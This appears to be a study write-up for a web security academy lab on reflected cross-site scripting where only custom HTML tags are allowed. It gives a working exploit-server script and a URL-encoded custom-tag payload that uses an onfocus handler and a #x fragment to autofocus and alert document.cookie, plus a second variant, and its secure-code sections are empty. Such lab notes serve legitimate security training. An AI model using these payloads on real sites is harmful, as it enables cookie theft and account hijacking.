## Reflected XSS into HTML context with all tags blocked except custom ones

### Objective:
- This lab blocks all HTML tags except custom ones.
- To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.

### Security Weakness:

### Exploitation Methodology:
1. Go to the exploit server and paste the following code, replacing `YOUR-LAB-ID` with your lab ID:
```html
<script> 
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'; 
</script>
```
2. Click "Store" and "Deliver exploit to victim". 
3. Understanding the payload: `<xss id=x onfocus=alert(document.cookie) tabindex=1>#x`
	1. `tabindex` value will make the html understand that on hitting the tab once it focuses on the element.
	2. `#x` will focus on the element based on the id without the user hitting tab.
4. This injection creates a custom tag with the ID `x`, which contains an `onfocus` event handler that triggers the `alert` function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the `alert` payload to be called.
5. Check if the below payload works and if not understand why it doesn't work.
```html
<script>
location = 'https://0a7d003f0460c6f380d01cfd00e300a1.web-security-academy.net/?search=%3Cimg2%20src%3D1%20onfocus%3Dalert%28document.cookie%29%3E#';
</script>
```

### Insecure Code:

### Secure Code:
